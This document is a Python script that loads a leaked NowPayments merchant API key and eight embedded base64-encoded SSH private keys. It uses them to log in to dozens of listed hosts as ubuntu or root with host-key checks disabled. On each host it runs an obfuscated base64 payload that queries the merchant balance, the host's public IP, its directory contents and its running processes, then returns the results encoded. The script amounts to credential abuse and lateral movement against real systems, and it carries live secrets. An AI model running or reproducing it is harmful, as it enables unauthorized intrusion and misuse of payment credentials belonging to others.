#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# i29808: NowPayments egress matrix - test leaked merchant API key from every reachable Lumii host.
import base64, subprocess, os, json, sys, time
from concurrent.futures import ThreadPoolExecutor

KEY = "2XYX9PY-0N04ME1-Q103E93-5DETTCF"
KEYS = {'hk': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'agentdoor': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBUHFmSDdoQUZuLzlvTGhibzRiSHNJTmtJYmVCTnFSZnRHVFdGZkRXYUtJZ0FBQUpnR3NiZVdCckczCmxnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQVBxZkg3aEFGbi85b0xoYm80YkhzSU5rSWJlQk5xUmZ0R1RXRmZEV2FLSWcKQUFBRURScnN4c0hQLzczU2NPdFV0WHh4VWdlSDZFM1N0Z2VDYUdyWmdJdm4zcFN3K3A4ZnVFQVdmLzJndUZ1amhzZXdnMgpRaHQ0RTJwRiswWk5ZVjhOWm9vaUFBQUFFWFZpZFc1MGRVQmhaMlZ1ZEMxa2IyOXlBUUlEQkE9PQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'brian_rsa': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUJsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFZRUF6aTZJM2NIM1M0VDVraTQ4TFh0OGVoZzcrd1JGOExEaTU1YWhxVmN1MXZsWTIxZmtFZnpyCkxqd1h4U2Q4TGJWaHVteDlVckN2ZG1adHU2MXZkQjBTK1MrOHlBOStRUEhJRFd3WlNyQUNYc2NaS0NndGNBWVRjMnJHd1IKSUpwNlFha2x6Y2wzUERZazJ1ZTVHanJNMCtaT005dktyS0Z0UzF6VFpUWmNHRElEUCtqaFRwK2lmazZaa0RRYUFZR1hZbgpHeWFMaE1hdzVJOEptTW1KT3Z1KzF5ZW56K1AwM1g1Z3VXLzFEc0hrQzJNSVVscCtnblJ6U1hOM3BhdU91UkdVQkR1cHYyClFMVEQxN00rdWttdHdma3FyVlduNVNVQnd3Rk03eGxPMkRjdnR4TmhJNjE2M0RmM3Y2Skpyc3drcFY4aWNBK09nT3NheW8KQXUxSERXOTRwMG9VWm1ENlNJWkJZN3hFNnpVZlI3cGcyTFJYUGUxLzBtZUNySmErMkIwMm94aUFsUE5mUzV4SFVYblA3egpEa2lvcm1kUjNzODRHNFFFaks5Nkh0NWJnYTZ1ZWdqOWpZT1JQenRFRlZoc2FkSGU3cjhBV1ZsNURxV1ZGZ3RPbFJHSmtFCkhYMzZoblVnMVYwWW5sb0RlYy9jb2NSaEZvZnlvY01UNnhXN0lCM1ZBQUFGbVByNmdSdjYrb0ViQUFBQUIzTnphQzF5YzIKRUFBQUdCQU00dWlOM0I5MHVFK1pJdVBDMTdmSG9ZTy9zRVJmQ3c0dWVXb2FsWEx0YjVXTnRYNUJIODZ5NDhGOFVuZkMyMQpZYnBzZlZLd3IzWm1iYnV0YjNRZEV2a3Z2TWdQZmtEeHlBMXNHVXF3QWw3SEdTZ29MWEFHRTNOcXhzRVNDYWVrR3BKYzNKCmR6dzJKTnJudVJvNnpOUG1UalBieXF5aGJVdGMwMlUyWEJneUF6L280VTZmb241T21aQTBHZ0dCbDJKeHNtaTRUR3NPU1AKQ1pqSmlUcjd2dGNucDgvajlOMStZTGx2OVE3QjVBdGpDRkphZm9KMGMwbHpkNldyanJrUmxBUTdxYjlrQzB3OWV6UHJwSgpyY0g1S3ExVnArVWxBY01CVE84WlR0ZzNMN2NUWVNPdGV0dzM5NytpU2E3TUpLVmZJbkFQam9EckdzcUFMdFJ3MXZlS2RLCkZHWmcra2lHUVdPOFJPczFIMGU2WU5pMFZ6M3RmOUpuZ3F5V3Z0Z2ROcU1ZZ0pUelgwdWNSMUY1eis4dzVJcUs1blVkN1AKT0J1RUJJeXZlaDdlVzRHdXJub0kvWTJEa1Q4N1JCVlliR25SM3U2L0FGbFplUTZsbFJZTFRwVVJpWkJCMTkrb1oxSU5WZApHSjVhQTNuUDNLSEVZUmFIOHFIREUrc1Z1eUFkMVFBQUFBTUJBQUVBQUFHQUhsZnc0cG9DT0FZSTZMK1BNYTVqd21CQXE0CitVYjNqSTNBWnFJazduWU5Idmh0Qm5pMUlxbG5KWG1UZFhhaTZ3aEV3bElYOUpRMmFOcmJvM2xlSVZnY0RKeXJPbEJBL1IKUGxCelpHK0UyY2Y1WnRTSzQxcXhrQ0hkd0ZwVU8yekdVRllFVFBISGhuY2lQNk5PY0VjQWNMNlV2bWh3TjIzMGw0L3dOQwpDSG1MeXVNT0RaRW15K25yWmJLVlJUVjZQdzIya1B6V21rYk82MEhkMURLZ0FVdFB0c0VnZGRhUitKUXFFOGNvQ01mRFNGCjdBRFBiNG1OMGZpQldrdG1STXhXTlhCMjNBU1pNWTIraXJNZENtT3FjVFlMdjFLMk4vcFd6NWdrVnFtRGNwcmlTQ3dGa1UKSUU2VWVTdXV4N2grZ2ppbjV3UlR6VG5DSjk5Z0dsa2dhSk1WV2dLU29XUHVTUHJLVGNXUGdmRkNhTTRtNHgrQ3F3VitONgp4WEwva3UzOVVjbEJCY3VRbWJIb2VwSnVzMWNsTEpwRTZYeTI5bE1YTFBvV3lFazVBbUFRVC8yaXVrVFIyRmZ2RmJlWVJkCm1KNndxdGxhNkE4M1VRbUJ0Rm1MeHdaVXRSTjFPSEpKcVhBa0dZamNQY1UzM0tQQ1NMSTJNeFMrc0xXWnVRb1dkQkFBQUEKd0FqdU5JY3RrMWFvelZ0TkdkS3ZUcGlTRmo3TlREeWxPaEZwTGxVT05zN2hhT0RiZkM4elRlS3prbm8zbFZIaWV0a0ZCaQppQmVxbUorSnQyYm5odjQwaG1Jcm84b1lYN3lCL2VmMllXRitxSUtGcFNsdW9GVS9hNW5WL201UGFlUXhXSXFiWGpTU09tCnBBRmw4eHNkUkZpd2F0RHg1K3RWaE1DQnZ1N0VNUTlLbjJNTE8wNVQrdnJIaEkyazIzQkdyaUo1SWFqWW0vMU5VRkFhVjMKVERoZ29WUTFqVjBheWNNUmNQYVIxS1N2UGtsSlJzU2JJSUlWdXFrb1lMa3Y1L3Z3QUFBTUVBK2VTRGxwZmVvTW1TTWhNdQphYjh5cmJ3ekoxd3hmZFU1dnlCOHFkc21DZVI5czYxMFpuT09XSktxR1E0MnJFeUh2dmRBY3JvMk5INWREVTB3UFZzVFJmCmFyMVBOb1BmYTU2b1VMMU1lU2hOQjg3a2tiWkdwMDJXenpVWEpXUmxBZEtVdHNWZ0wwZExWQ3J4eTY4MW1BZjFtZzBzcEUKUFN4N3Mvd08xcGhpNzdBVGVyQ0pZMGxTTDdVUXBIWDNsUThOK2lCYXpEWXNmOGdYbHJtMy8vck40SDlwS3pOcmhTRXdsNwpSWms3Z1RaNXZaNlp1eTZHMmI2dzN4dGYxUWQ1a1JBQUFBd1FEVE9JbTA0Qm9qbzBKUFluWTBmZHkwN2tvbU9McFN6bmRPCkpReWN4cW5aV3NVSVNvN3ZYZnRxS0JXMzltUDBMM1JDRFB6cWxmbVdsRDB5aGcvNVBtN2l3Q3Biemx2eTNSSVNXYXpRK3gKLzc2T0Y1YlNrbmdJakxSeGNmSEJtaWdnRS9xSWtWWW9uY1J1a2ZyQUxxSFlCelcrbG4vekNON3lzVTJrTzVOREE1U1pqQgpkbC90ek53VkRodUd2UjB5STl1UTdzeVZ3UFJxQ2RtMXEzNXpoOWY1d29oN2hYOGFWbmhoVU42eVpTZFNuajF1djdtUmpFClExOS9XN1dTeGtHSVVBQUFBZ1luSnBZVzUzZFVCQ2NtbGhibk10VFdGalFtOXZheTFRY204dWJHOWpZV3dCQWdNPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'fleet': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEK2lGM2FUd2ZGMzFoWkVRbGk0Wkk1cmt6VWNLVXdubkcyTnAzZi9RYlI5d0FBQUpEQnBma0N3YVg1CkFnQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRCtpRjNhVHdmRjMxaFpFUWxpNFpJNXJrelVjS1V3bm5HMk5wM2YvUWJSOXcKQUFBRUN2TFZDN1NZUDBoTVpSOENWaEE3MS9aQktBV3orNG9UMU0wL2ErT1JuVjdmNklYZHBQQjhYZldGa1JDV0xoa2ptdQpUTlJ3cFRDZWNiWTJuZC85QnRIM0FBQUFER052WkdWeVFHeDFiV2xwTmdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'lumii3': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBN2x2SEl2eHRpcko0OEhscHQ2MUt1VitGK2FUSEY0azVkeGFVc1M4bmk0UUFBQUpENmFTbDUrbWtwCmVRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTdsdkhJdnh0aXJKNDhIbHB0NjFLdVYrRithVEhGNGs1ZHhhVXNTOG5pNFEKQUFBRUNkMDJwS0pGdnJzbW1KMGs4bHRTc0c0ZmVVaHN5ZGtvcXFMR3lVN1c2ZDFUdVc4Y2kvRzJLc25qd2VXbTNyVXE1WAo0WDVwTWNYaVRsM0ZwU3hMeWVMaEFBQUFER052WkdWeVFHeDFiV2xwTXdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'edstage': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBMHlxWlR4VnJLMWdDOExLYkQxTmFpTEJRM3VCQjRlV21LY2R4M3Q4c2g1QUFBQUpBN3pXWEpPODFsCnlRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTB5cVpUeFZySzFnQzhMS2JEMU5haUxCUTN1QkI0ZVdtS2NkeDN0OHNoNUEKQUFBRUFRTnBKZC9ZOUF0RklFOXdGdm1rMEk1c1lqR0ovWENodE5oWHZVamVKd2l6VEtwbFBGV3NyV0FMd3Nwc1BVMXFJcwpGRGU0RUhoNWFZcHgzSGUzeXlIa0FBQUFDMngxYldscExXTnNiM1ZrQVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K', 'ezk0': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNDeVVpa0lJbkNJR0xSZ3krY0Z1TEwycWdoejRCblJhaXVzd0g3SzdvUFZxUUFBQUtDY2piNTluSTIrCmZRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3lVaWtJSW5DSUdMUmd5K2NGdUxMMnFnaHo0Qm5SYWl1c3dIN0s3b1BWcVEKQUFBRUNUTGcyYkFSNUZ4cUd4elJpWkUwZmdKRWFEV0xmVHhsRFpHdVBXZ2tZaUZMSlNLUWdpY0lnWXRHREw1d1c0c3ZhcQpDSFBnR2RGcUs2ekFmc3J1ZzlXcEFBQUFGblZpZFc1MGRVQnBjQzB4TnpJdE16RXRNVFF0TVRNQkFnTUVCUVlICi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=', 'brian_l3': 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBbmtpTGVlc0N5aFFOb0ZPbzJNT0plaWo1UWZ6ejFNOVBkY2ljSFJXb3NRUUFBQUpDN1lZMy91MkdOCi93QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQW5raUxlZXNDeWhRTm9GT28yTU9KZWlqNVFmenoxTTlQZGNpY0hSV29zUVEKQUFBRUN3dXZPYmJhbHA5cGMyeWFadDVjSGh1ajZVZWp3V2l3VDJTa1lRZlUwNEZ5ZVNJdDU2d0xLRkEyZ1U2all3NGw2SwpQbEIvUFBVejA5MXlKd2RGYWl4QkFBQUFER052WkdWeVFHeDFiV2xwTXdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K'}

def sh(cmd, tmo=60):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=tmo)
        return (p.stdout + p.stderr).decode("utf-8", "replace")
    except Exception as e:
        return "ERR:" + repr(e)

def R(k, v):
    if not isinstance(v, str):
        v = json.dumps(v, ensure_ascii=False)
    if len(v) > 30000:
        v = v[:30000] + "...TRUNC"
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(v.encode()).decode()))
    sys.stdout.flush()

# write keys
os.makedirs("/tmp/pnk", exist_ok=True)
for name, b64 in KEYS.items():
    try:
        p = "/tmp/pnk/" + name
        open(p, "wb").write(base64.b64decode(b64)); os.chmod(p, 0o600)
    except Exception as e:
        print("keywrite err", name, e)

REMOTE = r"""H=$(hostname 2>/dev/null||echo NA)
IP=$(curl -s --max-time 8 https://api.ipify.org 2>/dev/null||echo NOIP)
BAL=$(curl -s --max-time 12 -H "x-api-key: __KEY__" https://api.nowpayments.io/v1/balance 2>/dev/null|head -c 400)
CUR=$(curl -s --max-time 12 -H "x-api-key: __KEY__" https://api.nowpayments.io/v1/currencies 2>/dev/null|head -c 120)
ST=$(curl -s --max-time 12 https://api.nowpayments.io/v1/status 2>/dev/null|head -c 120)
LSB=$(ls /opt 2>/dev/null|tr '\n' ','|head -c 200)
PS=$(ps aux 2>/dev/null|grep -iE 'lumii-ai-backend|node .*backend|lumii.*api'|grep -v grep|head -2|cut -c1-80|tr '\n' '|')
echo "HOST=$H"; echo "IP=$IP"; echo "BAL=$BAL"; echo "CUR=$CUR"; echo "ST=$ST"; echo "OPT=$LSB"; echo "PS=$PS"
""".replace("__KEY__", KEY)

def ssh_test(host, port, user, keyname):
    kf = "/tmp/pnk/" + keyname
    if not os.path.exists(kf):
        return {"host": host, "user": user, "key": keyname, "err": "nokey"}
    b64 = base64.b64encode(REMOTE.encode()).decode()
    remote = "echo " + b64 + " | base64 -d | bash"
    cmd = ["ssh", "-i", kf, "-p", str(port), "-o", "BatchMode=yes",
           "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
           "-o", "ConnectTimeout=10", "-o", "IdentitiesOnly=yes",
           "%s@%s" % (user, host), remote]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=45)
        out = (p.stdout + p.stderr).decode("utf-8", "replace")
        return {"host": host, "port": port, "user": user, "key": keyname, "out": out[:1200]}
    except Exception as e:
        return {"host": host, "port": port, "user": user, "key": keyname, "err": repr(e)[:200]}

# runner egress first
rip = sh("curl -s --max-time 8 https://api.ipify.org").strip()
rb = sh('curl -s --max-time 12 -H "x-api-key: %s" https://api.nowpayments.io/v1/balance' % KEY).strip()
R("RUNNER", {"ip": rip, "bal": rb[:600]})

# targets: (host, port, user, keyname)
targets = []
tencent = ["43.143.107.214","122.51.1.87","43.142.238.91","1.14.34.31","129.211.0.26",
           "101.34.207.178","111.229.184.182","129.28.59.242","13.213.43.208","132.232.141.32",
           "139.155.94.165","49.235.41.58","54.169.172.218","81.68.254.22","81.69.230.90","101.32.60.77"]
for h in tencent:
    for u in ("ubuntu", "root"):
        targets.append((h, 22, u, "hk"))
# prod-agent alt port
targets.append(("129.211.0.26", 2246, "ubuntu", "hk"))
# AWS door / lumii hosts
targets.append(("54.67.97.25", 22, "ubuntu", "brian_rsa"))
targets.append(("13.214.183.170", 22, "ubuntu", "brian_rsa"))
targets.append(("18.142.48.45", 22, "coder", "lumii3"))
targets.append(("18.142.48.45", 22, "ubuntu", "hk"))
targets.append(("13.215.141.192", 22, "ubuntu", "agentdoor"))
targets.append(("13.215.141.192", 22, "root", "agentdoor"))
# brian staging key + fleet fallbacks on the centric hosts
for h in ["43.143.107.214","122.51.1.87"]:
    targets.append((h, 22, "ubuntu", "edstage"))
    targets.append((h, 22, "root", "fleet"))

def run_one(t):
    return ssh_test(*t)

results = []
with ThreadPoolExecutor(max_workers=12) as ex:
    for r in ex.map(run_one, targets):
        results.append(r)
R("RESULTS", results)
print("DONE")
